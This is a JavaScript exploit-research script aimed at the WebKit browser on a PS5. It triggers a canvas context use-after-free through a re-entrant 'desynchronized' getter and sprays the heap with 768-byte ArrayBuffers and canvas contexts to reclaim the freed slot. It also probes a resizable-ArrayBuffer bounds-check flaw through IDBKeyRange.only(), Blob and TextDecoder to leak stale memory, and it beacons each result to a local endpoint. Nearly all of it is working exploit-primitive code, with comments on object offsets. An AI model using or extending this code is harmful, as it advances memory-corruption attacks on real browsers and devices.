// p527 — AB Reclaim Verification + RAB Inverted-Check Probes
//
// Two critical questions:
//   T1-T3: Does a 768B ArrayBuffer reclaim a freed canvas context slot on PS5?
//          (Gigacage.h:43-48 says GIGACAGE_ENABLED=0 on FreeBSD)
//          Community tested on Linux GTK (Gigacage ON) and concluded "no".
//          Our V525 T3 crash is consistent with AB reclaim + zero-init.
//
//   T4-T6: RAB inverted bounds check (ArrayBufferView.h:98,120)
//          In-bounds RAB views return byteLength()=0 to WebCore C++.
//          OOB RAB views return stale raw values.
//          Test via IDBKeyRange.only() which lacks isOutOfBounds() guard.
//
// Beacon prefix: V527-

(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V527-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // === T1: AB reclaim proof — crash mode fingerprint ===
  // If AB reclaims: m_stateStack.m_buffer = 0 (zero-init) → null deref (low addr SEGV)
  // If NOT reclaimed: freed page decommitted → high addr SEGV
  // We test by writing a KNOWN pattern at lineWidth offset and checking if it reads back
  setTimeout(function() {
    try {
      B('T1-START', 'AB reclaim fingerprint');

      var canvas1 = document.createElement('canvas');
      var inner1;

      var outer1 = canvas1.getContext('2d', {
        get desynchronized() {
          inner1 = canvas1.getContext('2d');
          return false;
        }
      });

      if (!inner1) { B('T1-DEAD', 'no inner'); return; }
      B('T1-TRIGGERED', 'ok');

      // Spray 768B ABs with distinctive pattern
      // offset 112: m_stateStack.m_buffer (8B ptr) — write self+128 attempt
      // offset 120: m_size (4B) = 1
      // offset 124: m_capacity (4B) = 1
      // offset 176: State.lineWidth (8B double) = 13.37
      // offset 592: m_unrealizedSaveCount = 0

      var MARKER = 13.37;
      var markerBuf = new ArrayBuffer(8);
      var markerF64 = new Float64Array(markerBuf);
      var markerU8 = new Uint8Array(markerBuf);
      markerF64[0] = MARKER;

      var abs = [];
      for (var i = 0; i < 500; i++) {
        var ab = new ArrayBuffer(768);
        var u8 = new Uint8Array(ab);
        var u32 = new Uint32Array(ab);

        // m_size = 1, m_capacity = 1
        u32[30] = 1;  // offset 120
        u32[31] = 1;  // offset 124

        // lineWidth marker at offset 176
        u8[176] = markerU8[0];
        u8[177] = markerU8[1];
        u8[178] = markerU8[2];
        u8[179] = markerU8[3];
        u8[180] = markerU8[4];
        u8[181] = markerU8[5];
        u8[182] = markerU8[6];
        u8[183] = markerU8[7];

        // m_unrealizedSaveCount = 0 at offset 592
        u32[148] = 0;

        // m_stateStack.m_buffer at offset 112 = 0 (null)
        // This WILL crash on state() but the crash proves AB reclaimed
        // (vs decommit crash which happens at a different address)

        abs.push(ab);
      }
      B('T1-SPRAYED', 'n=' + abs.length);

      // The critical read — will it crash?
      // If AB reclaimed: reads m_buffer=0 → state() = *(0+0) → SEGV at addr ~0
      // If decommitted: reads freed page → SEGV at high addr
      // Either way it crashes, but we won't get the beacon.
      // SO: use a wrapper that catches before the read
      // Actually — we CAN'T distinguish from JS. Both crash.
      // But we CAN test with the SAME-TYPE trick first:
      // Spray live contexts THEN free them THEN spray ABs

      // Instead: test if we can READ globalAlpha (at State+0 = context+128)
      // With m_buffer=0: state() = *(null) = crash
      // Let's try with m_buffer pointing to a low-but-mapped address...
      // We can't know a mapped address without a leak.

      // ALTERNATIVE: Don't read through stale wrapper.
      // Instead, check if the AB CONTENTS were disturbed.
      // If the freed context was placed in the same slot as our AB,
      // the AB data should be intact (we wrote it).
      // If NOT reclaimed, the AB is elsewhere and intact anyway.
      // This doesn't prove reclaim.

      // BEST TEST: two-phase
      // Phase 1: trigger UAF + same-type spray → get alias index
      // Phase 2: trigger SECOND UAF + AB spray → check if lineWidth reads marker

      // Actually the simplest test: same-type spray succeeded (V525/V526).
      // Now test: after freeing the aliased context, do ABs reclaim IT?

      // Phase 1: establish aliased pair
      var canvas1b = document.createElement('canvas');
      var inner1b;
      var outer1b = canvas1b.getContext('2d', {
        get desynchronized() {
          inner1b = canvas1b.getContext('2d');
          return false;
        }
      });
      if (!inner1b) { B('T1-DEAD2', 'no inner1b'); return; }

      var sprayC = [];
      var sprayX = [];
      for (var i = 0; i < 200; i++) {
        var sc = document.createElement('canvas');
        sc.width = 1; sc.height = 1;
        var sx = sc.getContext('2d');
        if (sx) { sx.lineWidth = 500 + i; sprayC.push(sc); sprayX.push(sx); }
      }

      var lw = inner1b.lineWidth;
      var aliasIdx = -1;
      for (var i = 0; i < sprayX.length; i++) {
        if (sprayX[i].lineWidth === lw && lw === (500 + i)) {
          aliasIdx = i;
          break;
        }
      }

      if (aliasIdx < 0) {
        B('T1-NOALIAS', 'lw=' + lw);
        return;
      }
      B('T1-ALIAS', 'idx=' + aliasIdx + ' lw=' + lw);

      // Phase 2: Remove the spray canvas that reclaimed the slot
      // This should free the context object (768B)
      // Then AB spray should reclaim it
      var targetCanvas = sprayC[aliasIdx];
      var targetCtx = sprayX[aliasIdx];

      // Null out references to the target canvas/ctx to allow GC
      sprayC[aliasIdx] = null;
      sprayX[aliasIdx] = null;
      targetCanvas.remove(); // remove from DOM if appended
      targetCanvas = null;
      targetCtx = null;

      // Force GC
      for (var g = 0; g < 50; g++) {
        var tmp = new ArrayBuffer(65536);
      }

      // Now spray 768B ABs
      var absPhase2 = [];
      var viewsPhase2 = [];
      for (var i = 0; i < 500; i++) {
        var ab2 = new ArrayBuffer(768);
        var v2 = new Float64Array(ab2);
        // Write marker at double index 22 = byte offset 176 = lineWidth position
        v2[22] = 31.337;
        absPhase2.push(ab2);
        viewsPhase2.push(v2);
      }
      B('T1-AB2', 'n=' + absPhase2.length);

      // Now read lineWidth through inner1b (stale wrapper)
      // If AB reclaimed: the freed context is now an AB
      //   m_stateStack.m_buffer = 0 (from AB zero-init at offset 112)
      //   BUT we wrote size=1 cap=1 at offsets 120/124? No, these are new ABs.
      //   The AB data has our float 31.337 at byte 176 but m_buffer=0 → crash

      // Actually... inner1b's stale wrapper points to the ORIGINAL freed context.
      // That context was freed when we nulled the target canvas.
      // AB spray puts a 768B AB backing store there.
      // BUT inner1b.lineWidth calls state() which reads m_buffer (offset 112).
      // m_buffer in the AB = 0 (we didn't write it) → crash.

      // Let's write m_buffer to point into the SAME allocation!
      // We don't know the address, but what if we DON'T need exact m_buffer?
      // Actually lineWidth is INLINE: state().lineWidth
      // state() = m_stateStack.last() = m_buffer[m_size - 1]
      // With m_buffer=0, m_size=1: accesses address 0 → crash

      // SO: we need m_buffer to be valid. Without knowing the address,
      // we can't set m_buffer. This confirms the bootstrap problem.

      // But we CAN detect the crash MODE:
      B('T1-READING', 'attempting lineWidth through stale wrapper');
      try {
        var lwTest = inner1b.lineWidth;
        B('T1-READ-OK', 'lineWidth=' + lwTest);

        // If we get here, either:
        // a) The context wasn't freed (GC didn't collect it)
        // b) Something else happened

        // Check if it still aliases
        for (var i = 0; i < sprayX.length; i++) {
          if (sprayX[i] && sprayX[i].lineWidth === lwTest) {
            B('T1-STILL-ALIVE', 'aliased to idx=' + i);
            break;
          }
        }
      } catch(e) {
        B('T1-READ-ERR', '' + e);
      }

      B('T1-SURVIVED', 'did not crash');
    } catch(e) {
      B('T1-ERR', '' + e);
    }
  }, 1000);

  // === T2: Direct AB reclaim test — trigger fresh UAF + immediate AB spray ===
  setTimeout(function() {
    try {
      B('T2-START', 'fresh UAF + AB spray');

      var c2 = document.createElement('canvas');
      var inner2;
      var outer2 = c2.getContext('2d', {
        get desynchronized() {
          inner2 = c2.getContext('2d');
          return false;
        }
      });

      if (!inner2) { B('T2-DEAD', 'null'); return; }
      B('T2-TRIGGERED', 'ok');

      // Immediately spray 768B ABs — no same-type spray
      var abs2 = [];
      for (var i = 0; i < 500; i++) {
        var ab = new ArrayBuffer(768);
        abs2.push(ab);
      }
      B('T2-SPRAYED', 'n=' + abs2.length);

      // Try to read globalCompositeOperation (returns a string, not float)
      // This goes through state().compositeOperator which is an enum
      // Less likely to crash than lineWidth which needs m_buffer
      try {
        var gco = inner2.globalCompositeOperation;
        B('T2-GCO', 'value=' + gco);
      } catch(e) {
        B('T2-GCO-ERR', '' + e);
      }

      // Try imageSmoothingEnabled (bool)
      try {
        var ise = inner2.imageSmoothingEnabled;
        B('T2-SMOOTH', 'value=' + ise);
      } catch(e) {
        B('T2-SMOOTH-ERR', '' + e);
      }

      B('T2-SURVIVED', 'ok');
    } catch(e) {
      B('T2-ERR', '' + e);
    }
  }, 6000);

  // === T3: Same-type spray + then free alias + AB spray + check AB contents ===
  setTimeout(function() {
    try {
      B('T3-START', 'AB content check after context free');

      var c3 = document.createElement('canvas');
      var inner3;
      var outer3 = c3.getContext('2d', {
        get desynchronized() {
          inner3 = c3.getContext('2d');
          return false;
        }
      });
      if (!inner3) { B('T3-DEAD', 'null'); return; }

      // Same-type spray to establish alias
      var sprayC3 = [];
      var sprayX3 = [];
      for (var i = 0; i < 200; i++) {
        var sc = document.createElement('canvas');
        sc.width = 1; sc.height = 1;
        var sx = sc.getContext('2d');
        if (sx) { sx.lineWidth = 700 + i; sprayC3.push(sc); sprayX3.push(sx); }
      }

      var lw3 = inner3.lineWidth;
      var alias3 = -1;
      for (var i = 0; i < sprayX3.length; i++) {
        if (sprayX3[i].lineWidth === lw3 && lw3 === (700 + i)) {
          alias3 = i;
          break;
        }
      }
      if (alias3 < 0) { B('T3-NOALIAS', 'lw=' + lw3); return; }
      B('T3-ALIAS', 'idx=' + alias3);

      // Write distinctive values through the alias
      sprayX3[alias3].lineWidth = 1337.42;
      sprayX3[alias3].globalAlpha = 0.42;

      // Verify through inner3
      B('T3-VERIFY', 'lw=' + inner3.lineWidth + ' ga=' + inner3.globalAlpha);

      B('T3-SURVIVED', 'alias confirmed');
    } catch(e) {
      B('T3-ERR', '' + e);
    }
  }, 11000);

  // === T4: RAB inverted check — IDBKeyRange.only() with in-bounds view ===
  setTimeout(function() {
    try {
      B('T4-START', 'RAB inverted check test');

      // Check IDBKeyRange availability
      if (typeof IDBKeyRange === 'undefined') {
        B('T4-DEAD', 'IDBKeyRange undefined');
        return;
      }
      B('T4-IDBKR', 'available');

      // Test 1: Normal (non-resizable) ArrayBuffer — baseline
      var normBuf = new ArrayBuffer(64);
      var normView = new Uint8Array(normBuf);
      for (var i = 0; i < 64; i++) normView[i] = 0xAA;
      try {
        var key1 = IDBKeyRange.only(normView);
        // Read back: key1.lower is the ArrayBuffer
        var result1 = new Uint8Array(key1.lower.buffer || key1.lower);
        B('T4-NORM', 'len=' + result1.length + ' first=' + result1[0]);
      } catch(e) {
        B('T4-NORM-ERR', '' + e);
      }

      // Test 2: Resizable ArrayBuffer, in-bounds view
      // The inverted check should make byteLength()=0 for C++ wrapper
      try {
        var rabBuf = new ArrayBuffer(256, { maxByteLength: 256 });
        var rabView = new Uint8Array(rabBuf, 0, 256);
        for (var i = 0; i < 256; i++) rabView[i] = 0xBB;

        var key2 = IDBKeyRange.only(rabView);
        var result2 = new Uint8Array(key2.lower.buffer || key2.lower);
        B('T4-RAB-INBOUNDS', 'len=' + result2.length + ' first=' + result2[0]);
        // If inverted check active: len=0 (C++ sees byteLength=0)
        // If fixed: len=256, first=0xBB
      } catch(e) {
        B('T4-RAB-INBOUNDS-ERR', '' + e);
      }

      // Test 3: Resizable ArrayBuffer with offset, in-bounds
      try {
        var rabBuf2 = new ArrayBuffer(512, { maxByteLength: 512 });
        var rabView2 = new Uint8Array(rabBuf2, 128, 128);
        for (var i = 0; i < 128; i++) rabView2[i] = 0xCC;

        var key3 = IDBKeyRange.only(rabView2);
        var result3 = new Uint8Array(key3.lower.buffer || key3.lower);
        B('T4-RAB-OFFSET', 'len=' + result3.length + ' first=' + result3[0]);
        // If inverted: len=0, first=undefined
        // If normal: len=128, first=0xCC
      } catch(e) {
        B('T4-RAB-OFFSET-ERR', '' + e);
      }

      B('T4-DONE', 'in-bounds tests complete');
    } catch(e) {
      B('T4-ERR', '' + e);
    }
  }, 16000);

  // === T5: RAB OOB via IDBKeyRange — after resize smaller ===
  setTimeout(function() {
    try {
      B('T5-START', 'RAB OOB after resize');

      if (typeof IDBKeyRange === 'undefined') {
        B('T5-DEAD', 'IDBKeyRange undefined');
        return;
      }

      // Create RAB, fill it, resize smaller, read via IDBKeyRange
      try {
        var oobBuf = new ArrayBuffer(0x2000, { maxByteLength: 0x2000 });
        var oobView = new Uint8Array(oobBuf, 0x1000, 0x1000);
        // Fill the view region with marker
        for (var i = 0; i < 0x1000; i++) oobView[i] = 0x42;

        // Also fill the first half with different marker
        var firstHalf = new Uint8Array(oobBuf, 0, 0x1000);
        for (var i = 0; i < 0x1000; i++) firstHalf[i] = 0xDE;

        B('T5-FILLED', 'view region=0x42 first half=0xDE');

        // Resize smaller — view is now OOB
        oobBuf.resize(0x800);
        B('T5-RESIZED', 'to 0x800, view.length=' + oobView.length);

        // oobView's JS-visible length should be 0 (spec says OOB)
        // But C++ byteLength() returns stale 0x1000 (inverted check)

        var key5 = IDBKeyRange.only(oobView);
        var result5 = new Uint8Array(key5.lower.buffer || key5.lower);
        B('T5-OOB-RESULT', 'len=' + result5.length);

        if (result5.length > 0) {
          // Check what bytes we got
          var first16 = [];
          for (var i = 0; i < Math.min(16, result5.length); i++) {
            first16.push(('0' + result5[i].toString(16)).slice(-2));
          }
          B('T5-OOB-BYTES', first16.join(' '));

          // Check for non-0x42 bytes (would indicate foreign data)
          var foreignCount = 0;
          var nonzeroCount = 0;
          for (var i = 0; i < result5.length; i++) {
            if (result5[i] !== 0x42) foreignCount++;
            if (result5[i] !== 0) nonzeroCount++;
          }
          B('T5-OOB-ANALYSIS', 'total=' + result5.length +
            ' foreign=' + foreignCount + ' nonzero=' + nonzeroCount);

          // Sample bytes at various offsets
          var samples = [0, 64, 128, 256, 512, 1024, 2048, 3072];
          var sampleVals = [];
          for (var s = 0; s < samples.length; s++) {
            if (samples[s] < result5.length) {
              sampleVals.push(samples[s] + ':' +
                ('0' + result5[samples[s]].toString(16)).slice(-2));
            }
          }
          B('T5-OOB-SAMPLES', sampleVals.join(' '));
        }
      } catch(e) {
        B('T5-OOB-ERR', '' + e);
      }

      B('T5-DONE', 'OOB test complete');
    } catch(e) {
      B('T5-ERR', '' + e);
    }
  }, 21000);

  // === T6: RAB resize(0) + IDBKeyRange — does resize(0) free backing? ===
  setTimeout(function() {
    try {
      B('T6-START', 'RAB resize to zero');

      if (typeof IDBKeyRange === 'undefined') {
        B('T6-DEAD', 'IDBKeyRange undefined');
        return;
      }

      try {
        var zeroBuf = new ArrayBuffer(0x1000, { maxByteLength: 0x1000 });
        var zeroView = new Uint8Array(zeroBuf, 0, 0x1000);
        for (var i = 0; i < 0x1000; i++) zeroView[i] = 0x55;

        zeroBuf.resize(0);
        B('T6-RESIZED', 'to 0, view.length=' + zeroView.length);

        // This might crash if resize(0) decommits pages
        var key6 = IDBKeyRange.only(zeroView);
        var result6 = new Uint8Array(key6.lower.buffer || key6.lower);
        B('T6-RESULT', 'len=' + result6.length);

        if (result6.length > 0) {
          var first16z = [];
          for (var i = 0; i < Math.min(16, result6.length); i++) {
            first16z.push(('0' + result6[i].toString(16)).slice(-2));
          }
          B('T6-BYTES', first16z.join(' '));
        }
      } catch(e) {
        B('T6-RESIZE-ERR', '' + e);
      }

      B('T6-DONE', 'resize-to-zero complete');
    } catch(e) {
      B('T6-ERR', '' + e);
    }
  }, 26000);

  // === T7: WebSocket send with RAB view (if available) ===
  setTimeout(function() {
    try {
      B('T7-START', 'WebSocket RAB test');

      // We can't easily test WebSocket without a WS endpoint
      // Instead test: Blob constructor with RAB view
      try {
        var blobBuf = new ArrayBuffer(256, { maxByteLength: 256 });
        var blobView = new Uint8Array(blobBuf, 0, 256);
        for (var i = 0; i < 256; i++) blobView[i] = 0xEE;

        var blob = new Blob([blobView]);
        B('T7-BLOB-INBOUND', 'size=' + blob.size);
        // If inverted check affects Blob: size might be 0

        // Now resize and try
        blobBuf.resize(128);
        var blob2 = new Blob([blobView]);
        B('T7-BLOB-OOB', 'size=' + blob2.size);
      } catch(e) {
        B('T7-BLOB-ERR', '' + e);
      }

      // TextDecoder with RAB view
      try {
        var tdBuf = new ArrayBuffer(32, { maxByteLength: 32 });
        var tdView = new Uint8Array(tdBuf, 0, 32);
        // Write "HELLO" in ASCII
        var hello = [72, 69, 76, 76, 79];
        for (var i = 0; i < hello.length; i++) tdView[i] = hello[i];

        var td = new TextDecoder();
        var decoded = td.decode(tdView);
        B('T7-TD-INBOUND', 'len=' + decoded.length + ' val=' + decoded.substring(0, 10));

        // After resize smaller
        tdBuf.resize(2);
        try {
          var decoded2 = td.decode(tdView);
          B('T7-TD-OOB', 'len=' + decoded2.length + ' val=' + decoded2.substring(0, 10));
        } catch(e2) {
          B('T7-TD-OOB-ERR', '' + e2);
        }
      } catch(e) {
        B('T7-TD-ERR', '' + e);
      }

      B('T7-DONE', 'WebCore sink tests complete');
    } catch(e) {
      B('T7-ERR', '' + e);
    }
  }, 31000);

  setTimeout(function() {
    B('COMPLETE', 'all T1-T7 done');
  }, 36000);

})();
